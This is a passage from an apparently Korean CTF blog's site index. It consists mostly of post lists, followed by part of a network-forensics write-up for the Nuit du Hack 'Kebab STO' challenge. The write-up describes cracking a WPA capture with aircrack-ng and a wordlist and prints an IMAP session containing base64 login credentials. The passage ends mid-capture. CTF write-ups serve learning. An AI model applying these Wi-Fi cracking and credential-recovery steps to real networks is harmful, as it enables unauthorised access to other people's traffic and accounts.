[2018_Sharif_CTF] RunMe(50)\n       <small class=\"post-date\">16 Feb 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-Hidden-100/\">\n      <li>\n        [2018_Sharif_CTF] Hidden(100)\n       <small class=\"post-date\">16 Feb 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-Crashed-DB-50/\">\n      <li>\n        [2018_Sharif_CTF] Crashed DB(50)\n       <small class=\"post-date\">16 Feb 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_sharif/2018/02/15/Sharif-CTF-Client01-75/\">\n      <li>\n        [2018_Sharif_CTF] Client01(75)\n       <small class=\"post-date\">15 Feb 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/02/09/AceBear-CTF-STEg-Challenge-996/\">\n      <li>\n        [2018_AceBear_CTF] STEg Challenge(996)\n       <small class=\"post-date\">09 Feb 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/02/09/AceBear-CTF-My-idol-975/\">\n      <li>\n        [2018_AceBear_CTF] My idol(975)\n       <small class=\"post-date\">09 Feb 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/02/09/AceBear-CTF-Memory-951/\">\n      <li>\n        [2018_AceBear_CTF] Memory (951)\n       <small class=\"post-date\">09 Feb 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/02/09/AceBear-CTF-JS-999/\">\n      <li>\n        [2018_AceBear_CTF] JS (999)\n       <small class=\"post-date\">09 Feb 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_codegate/2018/02/06/Codegate-CTF-Welcome-to-droid-125/\">\n      <li>\n        [2018_Codegate_CTF] Welcome to droid (125)\n       <small class=\"post-date\">06 Feb 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_codegate/2018/02/06/Codegate-CTF-RedVelvet-75/\">\n      <li>\n        [2018_Codegate_CTF] RedVelvet (75)\n       <small class=\"post-date\">06 Feb 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_codegate/2018/02/06/Codegate-CTF-Easy-Serial-350/\">\n      <li>\n        [2018_Codegate_CTF] Easy_Serial (350)\n       <small class=\"post-date\">06 Feb 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/01/31/AceBear-CTF-Welcome-100/\">\n      <li>\n        [2018_AceBear_CTF] Forensic/MISC Welcome(100)\n       <small class=\"post-date\">31 Jan 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2017_sha/2018/01/13/SHA-CTF-Samsung-S4-300/\">\n      <li>\n        [2017_SHA_CTF] Samsung S4 (300)\n       <small class=\"post-date\">13 Jan 2018</small>\n      </li>\n      </a>\n      \n    </ul>\n    \n    <h2 id=\"2017-sha\">2017_SHA</h2>\n    <ul class=\"tags-expo-posts\">\n      \n        <a class=\"post-title\" href=\"/ctf/2017_sha/2018/01/13/SHA-CTF-Samsung-S4-300/\">\n      <li>\n        [2017_SHA_CTF] Samsung S4 (300)\n       <small class=\"post-date\">13 Jan 2018</small>\n      </li>\n      </a>\n      \n    </ul>\n    \n    <h2 id=\"etc\">etc</h2>\n    <ul class=\"tags-expo-posts\">\n      \n        <a class=\"post-title\" href=\"/etc/2018/01/26/OSX-Tensorflow-Install/\">\n      <li>\n        OSX Tensorflow Install\n       <small class=\"post-date\">26 Jan 2018</small>\n      </li>\n      </a>\n      \n    </ul>\n    \n    <h2 id=\"2018-acebear\">2018_AceBear</h2>\n    <ul class=\"tags-expo-posts\">\n      \n        <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/01/31/AceBear-CTF-Welcome-100/\">\n      <li>\n        [2018_AceBear_CTF] Forensic/MISC Welcome(100)\n       <small class=\"post-date\">31 Jan 2018</small>\n      </li>\n      </a>\n      \n    </ul>\n    \n    <h2 id=\"2018-codegate\">2018_Codegate</h2>\n    <ul class=\"tags-expo-posts\">\n      \n        <a class=\"post-title\" href=\"/ctf/2018_codegate/2018/02/06/Codegate-CTF-Welcome-to-droid-125/\">\n      <li>\n        [2018_Codegate_CTF] Welcome to droid (125)\n       <small class=\"post-date\">06 Feb 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_codegate/2018/02/06/Codegate-CTF-RedVelvet-75/\">\n      <li>\n        [2018_Codegate_CTF] RedVelvet (75)\n       <small class=\"post-date\">06 Feb 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_codegate/2018/02/06/Codegate-CTF-Easy-Serial-350/\">\n      <li>\n        [2018_Codegate_CTF] Easy_Serial (350)\n       <small class=\"post-date\">06 Feb 2018</small>\n      </li>\n      </a>\n      \n    </ul>\n    \n    <h2 id=\"2018-acebear\">2018_acebear</h2>\n    <ul class=\"tags-expo-posts\">\n      \n        <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/02/09/AceBear-CTF-STEg-Challenge-996/\">\n      <li>\n        [2018_AceBear_CTF] STEg Challenge(996)\n       <small class=\"post-date\">09 Feb 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/02/09/AceBear-CTF-My-idol-975/\">\n      <li>\n        [2018_AceBear_CTF] My idol(975)\n       <small class=\"post-date\">09 Feb 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/02/09/AceBear-CTF-Memory-951/\">\n      <li>\n        [2018_AceBear_CTF] Memory (951)\n       <small class=\"post-date\">09 Feb 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/02/09/AceBear-CTF-JS-999/\">\n      <li>\n        [2018_AceBear_CTF] JS (999)\n       <small class=\"post-date\">09 Feb 2018</small>\n      </li>\n      </a>\n      \n    </ul>\n    \n    <h2 id=\"2018-sharif\">2018_Sharif</h2>\n    <ul class=\"tags-expo-posts\">\n      \n        <a class=\"post-title\" href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-RunMe-50/\">\n      <li>\n        [2018_Sharif_CTF] RunMe(50)\n       <small class=\"post-date\">16 Feb 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-Hidden-100/\">\n      <li>\n        [2018_Sharif_CTF] Hidden(100)\n       <small class=\"post-date\">16 Feb 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-Crashed-DB-50/\">\n      <li>\n        [2018_Sharif_CTF] Crashed DB(50)\n       <small class=\"post-date\">16 Feb 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_sharif/2018/02/15/Sharif-CTF-Client01-75/\">\n      <li>\n        [2018_Sharif_CTF] Client01(75)\n       <small class=\"post-date\">15 Feb 2018</small>\n      </li>\n      </a>\n      \n    </ul>\n    \n    <h2 id=\"2018-securinets\">2018_Securinets</h2>\n    <ul class=\"tags-expo-posts\">\n      \n        <a class=\"post-title\" href=\"/ctf/2018_securinets/2018/03/26/Securinets-CTF-duck-hunt-300/\">\n      <li>\n        [2018_Securinets_CTF] duck_hunt(300)\n       <small class=\"post-date\">26 Mar 2018</small>\n      </li>\n      </a>\n      \n    </ul>\n    \n    <h2 id=\"2018-ndh\">2018_NDH</h2>\n    <ul class=\"tags-expo-posts\">\n      \n        <a class=\"post-title\" href=\"/ctf/2018_ndh/2018/04/02/NUIT-DU-HACK-CTF-Kebab-STO-350/\">\n      <li>\n        [2018_NUIT_DU_HACK_CTF] Kebab STO(350)\n       <small class=\"post-date\">02 Apr 2018</small>\n      </li>\n      </a>\n      \n    </ul>\n    \n  </div>\n</div>\n"
     
   } ,
  
   {
     
        "title"    : "Home",
        "category" : "",
        "tags"     : "",
        "url"      : "/",
        "date"     : "",
        "content"  : "<!DOCTYPE html>\n<html>\n  <head>\n    <meta charset=\"utf-8\">\n    <!-- jquery 추가 -->\n    <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js\"></script>\n    <style>\n      .category-title{\n        cursor: pointer;\n      }\n      .category-title:hover > h2{\n        text-decoration: underline;\n      }\n      .tags-expo-posts{\n        display: block;\n      }\n      #shortcut{\n        font-size: 1.1rem;\n        color: rgba(49, 49, 49, 0.82);\n      }\n\n      #shortcut-img{\n        width : 30px;\n        display : inline;\n        margin-right : 9px;\n        vertical-align : -webkit-baseline-middle;\n      }\n      </style>\n\n  </head>\n  <body>\n    <div class=\"tags-expo\">\n      <div class=\"tags-expo-list\">\n        \n        <a href=\"#life\" class=\"post-tag\">life</a>\n        \n        <a href=\"#ctf\" class=\"post-tag\">CTF</a>\n        \n        <a href=\"#2017-sha\" class=\"post-tag\">2017_SHA</a>\n        \n        <a href=\"#etc\" class=\"post-tag\">etc</a>\n        \n        <a href=\"#2018-acebear\" class=\"post-tag\">2018_AceBear</a>\n        \n        <a href=\"#2018-codegate\" class=\"post-tag\">2018_Codegate</a>\n        \n        <a href=\"#2018-acebear\" class=\"post-tag\">2018_acebear</a>\n        \n        <a href=\"#2018-sharif\" class=\"post-tag\">2018_Sharif</a>\n        \n        <a href=\"#2018-securinets\" class=\"post-tag\">2018_Securinets</a>\n        \n        <a href=\"#2018-ndh\" class=\"post-tag\">2018_NDH</a>\n        \n      </div>\n      <hr/>\n\n      <div class=\"tags-expo-section\">\n        <a href=\"/blog/\"><h4 id=\"shortcut\"><img id=\"shortcut-img\" src=\"/assets/images/shortcut.png\">최근 글 바로가기</h4></a>\n        <ul class=\"tags-expo-posts\">\n          \n          <a class=\"post-title\" href=\"/ctf/2018_ndh/2018/04/02/NUIT-DU-HACK-CTF-Kebab-STO-350/\">\n            <li>\n              [2018_NUIT_DU_HACK_CTF] Kebab STO(350)\n              <small class=\"post-date\">02 Apr 2018</small>\n            </li>\n          </a>\n          \n          <a class=\"post-title\" href=\"/ctf/2018_securinets/2018/03/26/Securinets-CTF-duck-hunt-300/\">\n            <li>\n              [2018_Securinets_CTF] duck_hunt(300)\n              <small class=\"post-date\">26 Mar 2018</small>\n            </li>\n          </a>\n          \n          <a class=\"post-title\" href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-RunMe-50/\">\n            <li>\n              [2018_Sharif_CTF] RunMe(50)\n              <small class=\"post-date\">16 Feb 2018</small>\n            </li>\n          </a>\n          \n          <a class=\"post-title\" href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-Hidden-100/\">\n            <li>\n              [2018_Sharif_CTF] Hidden(100)\n              <small class=\"post-date\">16 Feb 2018</small>\n            </li>\n          </a>\n          \n          <a class=\"post-title\" href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-Crashed-DB-50/\">\n            <li>\n              [2018_Sharif_CTF] Crashed DB(50)\n              <small class=\"post-date\">16 Feb 2018</small>\n            </li>\n          </a>\n          \n          <a class=\"post-title\" href=\"/ctf/2018_sharif/2018/02/15/Sharif-CTF-Client01-75/\">\n            <li>\n              [2018_Sharif_CTF] Client01(75)\n              <small class=\"post-date\">15 Feb 2018</small>\n            </li>\n          </a>\n          \n          <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/02/09/AceBear-CTF-STEg-Challenge-996/\">\n            <li>\n              [2018_AceBear_CTF] STEg Challenge(996)\n              <small class=\"post-date\">09 Feb 2018</small>\n            </li>\n          </a>\n          \n          <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/02/09/AceBear-CTF-My-idol-975/\">\n            <li>\n              [2018_AceBear_CTF] My idol(975)\n              <small class=\"post-date\">09 Feb 2018</small>\n            </li>\n          </a>\n          \n          <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/02/09/AceBear-CTF-Memory-951/\">\n            <li>\n              [2018_AceBear_CTF] Memory (951)\n              <small class=\"post-date\">09 Feb 2018</small>\n            </li>\n          </a>\n          \n          <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/02/09/AceBear-CTF-JS-999/\">\n            <li>\n              [2018_AceBear_CTF] JS (999)\n              <small class=\"post-date\">09 Feb 2018</small>\n            </li>\n          </a>\n          \n        </ul>\n\n\n        \n        <a class=\"category-title\"><h2 id=\"life\">life</h2></a>\n        <ul class=\"tags-expo-posts\">\n          \n            <a class=\"post-title\" href=\"/life/2017/12/31/2017%EB%85%84-%ED%9A%8C%EA%B3%A0%EB%A1%9D/\">\n          <li>\n            2017년 회고록\n          <small class=\"post-date\">31 Dec 2017</small>\n          </li>\n          </a>\n          \n        </ul>\n        \n        <a class=\"category-title\"><h2 id=\"ctf\">CTF</h2></a>\n        <ul class=\"tags-expo-posts\">\n          \n            <a class=\"post-title\" href=\"/ctf/2018_ndh/2018/04/02/NUIT-DU-HACK-CTF-Kebab-STO-350/\">\n          <li>\n            [2018_NUIT_DU_HACK_CTF] Kebab STO(350)\n          <small class=\"post-date\">02 Apr 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_securinets/2018/03/26/Securinets-CTF-duck-hunt-300/\">\n          <li>\n            [2018_Securinets_CTF] duck_hunt(300)\n          <small class=\"post-date\">26 Mar 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-RunMe-50/\">\n          <li>\n            [2018_Sharif_CTF] RunMe(50)\n          <small class=\"post-date\">16 Feb 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-Hidden-100/\">\n          <li>\n            [2018_Sharif_CTF] Hidden(100)\n          <small class=\"post-date\">16 Feb 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-Crashed-DB-50/\">\n          <li>\n            [2018_Sharif_CTF] Crashed DB(50)\n          <small class=\"post-date\">16 Feb 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_sharif/2018/02/15/Sharif-CTF-Client01-75/\">\n          <li>\n            [2018_Sharif_CTF] Client01(75)\n          <small class=\"post-date\">15 Feb 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/02/09/AceBear-CTF-STEg-Challenge-996/\">\n          <li>\n            [2018_AceBear_CTF] STEg Challenge(996)\n          <small class=\"post-date\">09 Feb 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/02/09/AceBear-CTF-My-idol-975/\">\n          <li>\n            [2018_AceBear_CTF] My idol(975)\n          <small class=\"post-date\">09 Feb 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/02/09/AceBear-CTF-Memory-951/\">\n          <li>\n            [2018_AceBear_CTF] Memory (951)\n          <small class=\"post-date\">09 Feb 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/02/09/AceBear-CTF-JS-999/\">\n          <li>\n            [2018_AceBear_CTF] JS (999)\n          <small class=\"post-date\">09 Feb 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_codegate/2018/02/06/Codegate-CTF-Welcome-to-droid-125/\">\n          <li>\n            [2018_Codegate_CTF] Welcome to droid (125)\n          <small class=\"post-date\">06 Feb 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_codegate/2018/02/06/Codegate-CTF-RedVelvet-75/\">\n          <li>\n            [2018_Codegate_CTF] RedVelvet (75)\n          <small class=\"post-date\">06 Feb 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_codegate/2018/02/06/Codegate-CTF-Easy-Serial-350/\">\n          <li>\n            [2018_Codegate_CTF] Easy_Serial (350)\n          <small class=\"post-date\">06 Feb 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/01/31/AceBear-CTF-Welcome-100/\">\n          <li>\n            [2018_AceBear_CTF] Forensic/MISC Welcome(100)\n          <small class=\"post-date\">31 Jan 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2017_sha/2018/01/13/SHA-CTF-Samsung-S4-300/\">\n          <li>\n            [2017_SHA_CTF] Samsung S4 (300)\n          <small class=\"post-date\">13 Jan 2018</small>\n          </li>\n          </a>\n          \n        </ul>\n        \n        <a class=\"category-title\"><h2 id=\"2017-sha\">2017_SHA</h2></a>\n        <ul class=\"tags-expo-posts\">\n          \n            <a class=\"post-title\" href=\"/ctf/2017_sha/2018/01/13/SHA-CTF-Samsung-S4-300/\">\n          <li>\n            [2017_SHA_CTF] Samsung S4 (300)\n          <small class=\"post-date\">13 Jan 2018</small>\n          </li>\n          </a>\n          \n        </ul>\n        \n        <a class=\"category-title\"><h2 id=\"etc\">etc</h2></a>\n        <ul class=\"tags-expo-posts\">\n          \n            <a class=\"post-title\" href=\"/etc/2018/01/26/OSX-Tensorflow-Install/\">\n          <li>\n            OSX Tensorflow Install\n          <small class=\"post-date\">26 Jan 2018</small>\n          </li>\n          </a>\n          \n        </ul>\n        \n        <a class=\"category-title\"><h2 id=\"2018-acebear\">2018_AceBear</h2></a>\n        <ul class=\"tags-expo-posts\">\n          \n            <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/01/31/AceBear-CTF-Welcome-100/\">\n          <li>\n            [2018_AceBear_CTF] Forensic/MISC Welcome(100)\n          <small class=\"post-date\">31 Jan 2018</small>\n          </li>\n          </a>\n          \n        </ul>\n        \n        <a class=\"category-title\"><h2 id=\"2018-codegate\">2018_Codegate</h2></a>\n        <ul class=\"tags-expo-posts\">\n          \n            <a class=\"post-title\" href=\"/ctf/2018_codegate/2018/02/06/Codegate-CTF-Welcome-to-droid-125/\">\n          <li>\n            [2018_Codegate_CTF] Welcome to droid (125)\n          <small class=\"post-date\">06 Feb 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_codegate/2018/02/06/Codegate-CTF-RedVelvet-75/\">\n          <li>\n            [2018_Codegate_CTF] RedVelvet (75)\n          <small class=\"post-date\">06 Feb 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_codegate/2018/02/06/Codegate-CTF-Easy-Serial-350/\">\n          <li>\n            [2018_Codegate_CTF] Easy_Serial (350)\n          <small class=\"post-date\">06 Feb 2018</small>\n          </li>\n          </a>\n          \n        </ul>\n        \n        <a class=\"category-title\"><h2 id=\"2018-acebear\">2018_acebear</h2></a>\n        <ul class=\"tags-expo-posts\">\n          \n            <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/02/09/AceBear-CTF-STEg-Challenge-996/\">\n          <li>\n            [2018_AceBear_CTF] STEg Challenge(996)\n          <small class=\"post-date\">09 Feb 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/02/09/AceBear-CTF-My-idol-975/\">\n          <li>\n            [2018_AceBear_CTF] My idol(975)\n          <small class=\"post-date\">09 Feb 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/02/09/AceBear-CTF-Memory-951/\">\n          <li>\n            [2018_AceBear_CTF] Memory (951)\n          <small class=\"post-date\">09 Feb 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_acebear/2018/02/09/AceBear-CTF-JS-999/\">\n          <li>\n            [2018_AceBear_CTF] JS (999)\n          <small class=\"post-date\">09 Feb 2018</small>\n          </li>\n          </a>\n          \n        </ul>\n        \n        <a class=\"category-title\"><h2 id=\"2018-sharif\">2018_Sharif</h2></a>\n        <ul class=\"tags-expo-posts\">\n          \n            <a class=\"post-title\" href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-RunMe-50/\">\n          <li>\n            [2018_Sharif_CTF] RunMe(50)\n          <small class=\"post-date\">16 Feb 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-Hidden-100/\">\n          <li>\n            [2018_Sharif_CTF] Hidden(100)\n          <small class=\"post-date\">16 Feb 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-Crashed-DB-50/\">\n          <li>\n            [2018_Sharif_CTF] Crashed DB(50)\n          <small class=\"post-date\">16 Feb 2018</small>\n          </li>\n          </a>\n          \n            <a class=\"post-title\" href=\"/ctf/2018_sharif/2018/02/15/Sharif-CTF-Client01-75/\">\n          <li>\n            [2018_Sharif_CTF] Client01(75)\n          <small class=\"post-date\">15 Feb 2018</small>\n          </li>\n          </a>\n          \n        </ul>\n        \n        <a class=\"category-title\"><h2 id=\"2018-securinets\">2018_Securinets</h2></a>\n        <ul class=\"tags-expo-posts\">\n          \n            <a class=\"post-title\" href=\"/ctf/2018_securinets/2018/03/26/Securinets-CTF-duck-hunt-300/\">\n          <li>\n            [2018_Securinets_CTF] duck_hunt(300)\n          <small class=\"post-date\">26 Mar 2018</small>\n          </li>\n          </a>\n          \n        </ul>\n        \n        <a class=\"category-title\"><h2 id=\"2018-ndh\">2018_NDH</h2></a>\n        <ul class=\"tags-expo-posts\">\n          \n            <a class=\"post-title\" href=\"/ctf/2018_ndh/2018/04/02/NUIT-DU-HACK-CTF-Kebab-STO-350/\">\n          <li>\n            [2018_NUIT_DU_HACK_CTF] Kebab STO(350)\n          <small class=\"post-date\">02 Apr 2018</small>\n          </li>\n          </a>\n          \n        </ul>\n        \n      </div>\n    </div>\n\n  <!-- 카테고리 글 숨김, 표시 전환 코드 -->\n  <script type=\"text/javascript\">\n\n    $(\".category-title\").click(function(){\n\n      if ($(this).next().css('display') === 'block'){\n        $(this).next().slideUp()\n        $(this).children().css(\"color\", \"#393939\")\n      }else{\n        $(this).next().slideDown('slow')\n        $(this).children().css(\"color\", \"#ec4c6a\")\n      }\n    })\n\n\n  </script>\n  </body>\n</html>\n"
     
   } ,
  
   {
     
        "title"    : "Blog",
        "category" : "",
        "tags"     : "",
        "url"      : "/blog/",
        "date"     : "",
        "content"  : "<div class=\"posts\">\n  \n  <div class=\"post\">\n    <h1 class=\"post-title\">\n      <a href=\"/ctf/2018_ndh/2018/04/02/NUIT-DU-HACK-CTF-Kebab-STO-350/\">\n        [2018_NUIT_DU_HACK_CTF] Kebab STO(350)\n      </a>\n    </h1>\n\n    <span class=\"post-date\">02 Apr 2018</span>\n     |\n    \n    <a href=\"/blog/tags/#network\" class=\"post-tag\">Network</a>\n    \n    \n\n    <article>\n      <h2 id=\"exercise\">Exercise</h2>\n\n<blockquote>\n  <p>Description\nThe challenge consists in finding the flag into a network capture.\nChallenge is listening on port 8888\nUrl : tcp://kebabsto.challs.malice.fr/</p>\n</blockquote>\n\n<p><img src=\"/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/exercise.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] exercise</p>\n\n<h2 id=\"solution\">Solution</h2>\n\n<p>Network 문제, Pcap 파일(<code class=\"highlighter-rouge\">kebabsto.pcapng</code>)을 확인할 수 있다. HTTP Object 를 먼저 확인했을 때, “kdsqfkpdsdf” 파일을 download 한 것을 확인.</p>\n\n<p><img src=\"/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/1.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] HTTP Object</p>\n\n<p>save 하고, ZIP 확장자를 가지며 압축을 풀었을 때 “lkdjflknezcz”라는 tcp packet file를 획득할 수 있었다. file signature 를 통해서, 802.11 packet file임을 알 수 있다.</p>\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Nu_it_du_hack/Network\n file ./kdsqfkpdsdf\n./kdsqfkpdsdf: Zip archive data, at least v2.0 to extract\n jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Nu_it_du_hack/Network\n unzip ./kdsqfkpdsdf\nArchive:  ./kdsqfkpdsdf\n  inflating: lkdjflknezcz\n jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Nu_it_du_hack/Network\n file ./lkdjflknezcz\n./lkdjflknezcz: tcpdump capture file <span class=\"o\">(</span>little-endian<span class=\"o\">)</span> - version 2.4 <span class=\"o\">(</span>802.11, capture length 65535<span class=\"o\">)</span>\n</code></pre></div></div>\n\n<p>하지만, 802.11 packet 내용에 대해서는 아래와 같이 식별할 수 있는 정보들이 존재하지 않았다. WPA 방식의 Encrypt를 사용하고 있었으며, 이를 decrypt할 필요가 보였다.\n<img src=\"/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/2.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] lkdjflknezcz pcap</p>\n\n<p>802.11 packet decrypt를 위해서는 wireshark preference의 802.11 항목에 Password:SSID를 넣어주어야 하는데 이를 구하기 위해 <code class=\"highlighter-rouge\">aircrack-ng</code>과 사전파일을 이용해 WPA 방식의 인증을 풀어내었다. password = “abcdefgh” (간단하게 해결될 수 있는 부분이었는데 아래에 TCP 통신을 통해 Decrypt Message와 관련된 부분을 이용해 진행하려다 시간을 많이 허비)\n<img src=\"/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/3.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] aircrack-ng</p>\n\n<p>아래와 같이, preference 에서 ssid, pw 정보를 이용해 decrypt 하겠다고 명시해준 후, packet 을 확인해보면, zip 파일의 전송을 확인할 수 있다. raw 로 type 변환 후, 확인한 결과 압축 해제시 Password 를 요구하는 것을 볼 수 있었다. (Password와 관련된 항목을 찾아내야 하는데, 이 부분에서 좀 헤맸던 것 같다.)\n<img src=\"/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/4.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] 802.11 decrypt</p>\n\n<p><img src=\"/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/5.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] 802.11 packet transfer</p>\n\n<p><img src=\"/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/6.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] pk password</p>\n\n<p>결과적으로 첫번째, pcap file (“kebabsto”)에서 관련 항목을 찾아낼 수 있었는데, frame contains 을 통해, “flag”, “zip”, “PK” 등의 packet filtering 을 한 결과 SMTP를 통해 전송된 아래 데이터를 확인할 수 있었고, “docs.zip”라는 파일을 추가적으로 식별할 수 있었다.</p>\n\n<div class=\"highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE AUTH=PLAIN AUTH=LOGIN] Dovecot ready.\n1 authenticate PLAIN\n+\nAHRvbWF0ZUBkZWJpYW4ueW8AdG9tYXRlMTIz\n1 OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS SPECIAL-USE BINARY MOVE] Logged in\n2 ID (\"name\" \"Thunderbird\" \"version\" \"52.4.0\")\n* ID (\"name\" \"Dovecot\")\n2 OK ID completed.\n3 select \"Sent\"\n* FLAGS (\\Answered \\Flagged \\Deleted \\Seen \\Draft)\n* OK [PERMANENTFLAGS (\\Answered \\Flagged \\Deleted \\Seen \\Draft \\*)] Flags permitted.\n* 17 EXISTS\n* 0 RECENT\n* OK [UIDVALIDITY 1513610478] UIDs valid\n* OK [UIDNEXT 18] Predicted next UID\n3 OK [READ-WRITE] Select completed (0.001 secs).\n4 UID fetch 1:* (FLAGS)\n* 1 FETCH (UID 1 FLAGS (\\Seen))\n* 2 FETCH (UID 2 FLAGS (\\Seen))\n* 3 FETCH (UID 3 FLAGS (\\Seen))\n* 4 FETCH (UID 4 FLAGS (\\Seen))\n* 5 FETCH (UID 5 FLAGS (\\Seen))\n* 6 FETCH (UID 6 FLAGS (\\Seen))\n* 7 FETCH (UID 7 FLAGS (\\Seen))\n* 8 FETCH (UID 8 FLAGS (\\Seen))\n* 9 FETCH (UID 9 FLAGS (\\Seen))\n* 10 FETCH (UID 10 FLAGS (\\Seen))\n* 11 FETCH (UID 11 FLAGS (\\Seen))\n* 12 FETCH (UID 12 FLAGS (\\Seen))\n* 13 FETCH (UID 13 FLAGS (\\Seen))\n* 14 FETCH (UID 14 FLAGS (\\Seen))\n* 15 FETCH (UID 15 FLAGS (\\Seen))\n* 16 FETCH (UID 16 FLAGS (\\Seen))\n* 17 FETCH (UID 17 FLAGS (\\Seen))\n4 OK Fetch completed.\n5 UID fetch 17 (UID RFC822.SIZE FLAGS BODY.PEEK[HEADER.FIELDS (From To Cc Bcc Subject Date Message-ID Priority X-Priority References Newsgroups In-Reply-To Content-Type 